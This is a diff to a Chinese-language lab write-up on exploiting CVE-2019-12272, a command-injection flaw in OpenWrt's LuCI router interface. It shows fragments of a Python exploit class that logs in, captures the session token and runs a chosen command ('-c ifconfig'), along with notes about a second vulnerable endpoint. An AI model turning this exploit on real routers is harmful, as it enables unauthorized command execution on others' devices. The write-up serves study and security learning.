@@ -7,7 +7,7 @@
     - [漏洞利用](#漏洞利用)
       - [代码](#代码)
       - [代码编写](#代码编写)
-  - [算是一点感想吧](#算是一点感想吧)
+  - [算是一些感想吧](#算是一些感想吧)
   - [参考](#参考)
 ## 实验环境
 
@@ -125,6 +125,10 @@ data = {
 response = requests.post('http://192.168.189.189/cgi-bin/luci', headers=headers, data=data, verify=False)
 ```
 
+尽管并没有什么用但还是在 BurpSuite 里面重放了一次登录。
+
+![](imgs/loginBurpSuiteSend.png)
+
 #### 代码编写
 
 代码编写的核心思想就是使代码看起来「工具化」，减少硬编码。
@@ -166,7 +170,7 @@ class CVE_2019_12272:
             'luci_password': '{passwd}'.format(passwd=self.password)
         }
         response = requests.post(self.headers['Referer'], headers=self.headers, data=data, verify=False,
-                                 allow_redirects=False)
+                                 allow_redirects=False) # 302 意为 Moved Temporarily，必须ban掉重定向
         location = response.headers["Location"]
         self.stok = urlparse(location).params
         self.cookies = response.cookies
@@ -191,7 +195,7 @@ class CVE_2019_12272:
 
 
 def run():
-    parser = argparse.ArgumentParser(description='传入参数组')
+    parser = argparse.ArgumentParser(description='传入 参数 组')
     requiredNames = parser.add_argument_group('Required Named Arguments')
     requiredNames.add_argument('-a', '--host', help='ip host', required=True)  # -h 被--help占用
     requiredNames.add_argument('-u', '--username', help='username', required=True)
@@ -218,11 +222,12 @@ python main.py -a 192.168.189.189 -u root -p 123456 -c 'ifconfig'
 
 ![](imgs/answer.png)
 
-## 算是一点感想吧
+## 算是一些感想吧
 
-感觉写EXP比用鼠标酷炫多了。
-
-这次试验其实暴露出很多我个人的问题，比如自己写的时候一直登录不上LuCI，最后看了黄大的视频才解决。还有一个是感觉我写的代码不太优雅（args向self传参有点傻），python使用还不是很熟练。
+- CVE-2019-1227 其实漏洞有两个，直接把 `.../bandwidth_status/...` 替换成 `.../wireless_status/...` 可以直接达到对另一个漏洞的利用。
+- （其实不用获取stok也行，直接访问 `...cgi-bin/luci/admin/status...` 不影响代码最终输出结果。。。。。）
+- 感觉写EXP比用鼠标酷炫多了(๑•̀ㅂ•́)و✧。
+- 这次试验其实暴露出很多我个人的问题，比如自己写的时候一直登录不上LuCI，最后看了黄大的视频才解决。还有一个是感觉我写的代码不太优雅（args向self传参有点丑但是又不知道怎么改），python使用还不是很熟练。
 
 ## 参考
 
